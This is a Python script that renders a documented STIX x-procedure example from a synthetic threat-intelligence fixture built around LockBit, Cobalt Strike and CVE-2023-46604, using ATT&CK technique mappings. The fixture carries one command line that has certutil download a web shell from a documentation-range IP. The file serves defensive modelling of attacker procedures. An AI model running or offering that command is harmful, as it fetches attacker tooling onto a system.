"""Render the x-procedure example the documentation quotes.

WHY:
README.md and docs/X_PROCEDURE.md section 14 show one procedure "abridged from
real serializer output on a synthetic fixture". A hand-copied example rots:
the first one shipped with fabricated technique ids, which the catalogue
lookup could never match, so the object carried no log sources, a gap the
tuple check itself grades as an error at that confidence. This script is the
reproducible source of the example. It runs the deterministic tail
(normalize -> serialize_stix -> validate_bundle) over the same three drafts
and six entities as tests/conftest.py, against the ATT&CK catalogue in Neo4j,
and prints the objects the docs quote.

The fixture data is duplicated here rather than imported: the api image
copies backend/ only, so the repo-root tests/ package is not importable
inside the container. Keep the two in step.

USAGE (the api container reaches Neo4j by its compose name):
    docker compose exec -w /app api python -m scripts.render_procedure_example
    docker compose exec -w /app api python -m scripts.render_procedure_example \
        --json /tmp/example_bundle.json

Exits 1 when the example procedure has no x_log_source_refs. That means the
catalogue was unreachable, and the docs must not be regenerated from that run.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import sys
from collections import Counter, defaultdict
from dataclasses import asdict

from app.graph.state import (
    Channel, Entity, EntityType, GateAction, PipelineStatus,
    ProcedureDraft, SourceType, TechniqueMapping,
)
from app.nodes.deterministic.bundle_validator import validate_bundle
from app.nodes.deterministic.normalization import normalize
from app.nodes.deterministic.serialization import serialize_stix

EXAMPLE_PROCEDURE_NAME = "Download web shell via certutil"


def _build_state() -> dict:
    """The tests/conftest.py fixture: sample_entities + sample_drafts + base_state.

    Technique stix_ids are the real v19.2 catalogue ids; platforms use the
    OpenTide title-case form the drafting normalizer emits on a live run.
    """
    entities = [
        asdict(Entity(entity_id="ent-001", entity_type=EntityType.INTRUSION_SET.value,
                      value="LockBit 3.0", confidence=0.92,
                      gate_action=GateAction.APPROVE.value)),
        asdict(Entity(entity_id="ent-002", entity_type=EntityType.MALWARE.value,
                      value="Cobalt Strike", confidence=0.88,
                      gate_action=GateAction.APPROVE.value)),
        asdict(Entity(entity_id="ent-003", entity_type=EntityType.TOOL.value,
                      value="certutil.exe", confidence=0.95,
                      gate_action=GateAction.APPROVE.value)),
        asdict(Entity(entity_id="ent-004", entity_type=EntityType.IOC_IP.value,
                      value="203.0.113.10", confidence=0.85,
                      gate_action=GateAction.APPROVE.value)),
        asdict(Entity(entity_id="ent-005", entity_type=EntityType.CAMPAIGN.value,
                      value="ActiveMQ exploitation wave", confidence=0.80,
                      gate_action=GateAction.APPROVE.value)),
        asdict(Entity(entity_id="ent-006", entity_type=EntityType.VULNERABILITY.value,
                      value="CVE-2023-46604", confidence=1.0,
                      gate_action=GateAction.APPROVE.value)),
    ]

    drafts = [
        asdict(ProcedureDraft(
            draft_id="dft-001", chunk_id="chk-001",
            name="Exploit Apache ActiveMQ via CVE-2023-46604",
            description="The threat actor exploited CVE-2023-46604 to gain initial access.",
            techniques=[TechniqueMapping(
                technique_id="T1190",
                stix_id="attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                technique_name="Exploit Public-Facing Application",
                tactic="initial-access", confidence=0.87,
            )],
            platforms=["Linux", "Windows::Server"],
            confidence=87, sequence_index=1,
            first_observed="2023-10-25T00:00:00Z",
        )),
        asdict(ProcedureDraft(
            draft_id="dft-002", chunk_id="chk-002",
            name=EXAMPLE_PROCEDURE_NAME,
            description="The actor used certutil.exe to download a web shell from the C2 server.",
            techniques=[
                TechniqueMapping(
                    technique_id="T1059.003", technique_name="Windows Command Shell",
                    tactic="execution", confidence=0.82,
                    stix_id="attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
                ),
                TechniqueMapping(
                    technique_id="T1105", technique_name="Ingress Tool Transfer",
                    tactic="command-and-control", confidence=0.79,
                    stix_id="attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
                ),
            ],
            platforms=["Windows::Server"],
            command_lines=["certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp"],
            confidence=79, sequence_index=2, predecessor_indices=[1],
        )),
        asdict(ProcedureDraft(
            draft_id="dft-003", chunk_id="chk-003",
            name="Execute Cobalt Strike beacon via PowerShell",
            description="PowerShell was used to download and execute a Cobalt Strike beacon.",
            techniques=[TechniqueMapping(
                technique_id="T1059.001",
                stix_id="attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
                technique_name="powershell",
                tactic="execution", confidence=0.75,
            )],
            platforms=["Windows::Server"],
            confidence=72, sequence_index=3, predecessor_indices=[2],
            detail_gap=True,
        )),
    ]
    drafts[1]["raw_command_lines"] = drafts[1].get("command_lines", [])
    for draft in drafts:
        draft["procedure_type"] = "reporting"

    return {
        "source_id": "src-test-001",
        "channel": Channel.MANUAL.value,
        "source_type": SourceType.FREE_TEXT.value,
        "raw_content_path": "",
        "title": "Synthetic fixture (tests/conftest.py)",
        "metadata": {"author": "Test Author", "publication_date": "2023-11-15"},
        "source_reliability": 85,
        "gates_enabled": False,
        "is_sequential": True,
        "status": PipelineStatus.NORMALIZING.value,
        "current_node": "normalize",
        "error": None,
        "entities": entities,
        "detection_rules": [],
        "validated_entities": entities,
        "classified_sections": [],
        "chunks": [],
        "technique_mappings": {},
        "drafts": drafts,
        "gate1_decisions": [{"draft_id": d["draft_id"], "action": "approve"} for d in drafts],
        "gate1_approved_draft_ids": [d["draft_id"] for d in drafts],
        "gate1_rejection_routing": None,
        "gate2_decision": {"approved": True, "feedback": None},
    }


def _dump(obj: dict) -> str:
    return json.dumps(obj, indent=2, ensure_ascii=False)


def _section(title: str) -> None:
    print(f"\n=== {title} ===")


async def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("--json", metavar="PATH",
                        help="also write the whole validated bundle here")
    args = parser.parse_args()

    state = _build_state()
    state.update(normalize(state))
    state.update(await serialize_stix(state))
    state.update(validate_bundle(state))

    bundle = state["stix_bundle"]
    objects = bundle["objects"]
    by_id = {o["id"]: o for o in objects if "id" in o}
    t_number = {
        t["stix_id"]: t["technique_id"]
        for d in state["drafts"] for t in d["techniques"] if t.get("stix_id")
    }

    _section("bundle")
    print(f"validation_failed: {state.get('bundle_validation_failed', False)}")
    for kind, n in sorted(Counter(o.get("type") for o in objects).items()):
        print(f"  {n:3d}  {kind}")

    proc = next(
        (o for o in objects
         if o.get("type") == "x-procedure" and o.get("name") == EXAMPLE_PROCEDURE_NAME),
        None,
    )
    if proc is None:
        print(f"no procedure named {EXAMPLE_PROCEDURE_NAME!r} in the bundle", file=sys.stderr)
        return 1

    _section("x-procedure")
    print(_dump(proc))

    _section("x-log-source objects it references")
    for ref in proc.get("x_log_source_refs", []):
        print(_dump(by_id[ref]))

    _section("components (x_components_refs)")
    for ref in proc.get("x_components_refs", []):
        print(_dump(by_id[ref]))

    _section("relationships naming the procedure")
    for rel in objects:
        if rel.get("type") != "relationship":
            continue
        if proc["id"] not in (rel.get("source_ref"), rel.get("target_ref")):
            continue
        ends = []
        for ref in (rel["source_ref"], rel["target_ref"]):
            label = ref
            if ref in t_number:
                label += f"  ({t_number[ref]})"
            elif ref in by_id and by_id[ref].get("name") and ref != proc["id"]:
                label += f"  ({by_id[ref]['type']}: {by_id[ref]['name']})"
            ends.append(label)
        print(f"{rel['relationship_type']:14s} {ends[0]}\n{'':14s} -> {ends[1]}")

    _section("detection chain embedded for the bundle's techniques")
    chain_types = ("attack-pattern", "x-mitre-detection-strategy",
                   "x-mitre-analytic", "x-mitre-data-component", "x-log-source")
    for kind in chain_types:
        n = sum(1 for o in objects if o.get("type") == kind)
        print(f"  {n:3d}  {kind}")
    chain_rels = Counter(
        o["relationship_type"] for o in objects
        if o.get("type") == "relationship"
        and o["relationship_type"] in ("detects", "has-analytic", "uses-data-component")
    )
    for rtype, n in sorted(chain_rels.items()):
        print(f"  {n:3d}  relationship: {rtype}")

    _section("validator corrections")
    grouped: dict[str, dict[str, int]] = defaultdict(lambda: defaultdict(int))
    for c in state.get("bundle_corrections", []):
        grouped[c.get("severity", "?")][c.get("rule", "?")] += 1
    if not grouped:
        print("  (none)")
    for severity, rules in grouped.items():
        print(f"  [{severity}]")
        for rule, n in sorted(rules.items()):
            print(f"    {rule}: {n}")

    _section("serializer validation (schema, references, attack flow, tuple)")
    for check, ok in (state.get("validation_results") or {}).items():
        print(f"  {'ok  ' if ok else 'FAIL'}  {check}")
    for err in state.get("validation_errors") or []:
        print(f"  {err}")

    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(bundle, fh, indent=2, ensure_ascii=False)
        print(f"\nfull bundle written to {args.json}")

    if not proc.get("x_log_source_refs"):
        print(
            "\nNO LOG SOURCES: the catalogue query returned nothing, so this run "
            "must not be used to regenerate the docs.", file=sys.stderr,
        )
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
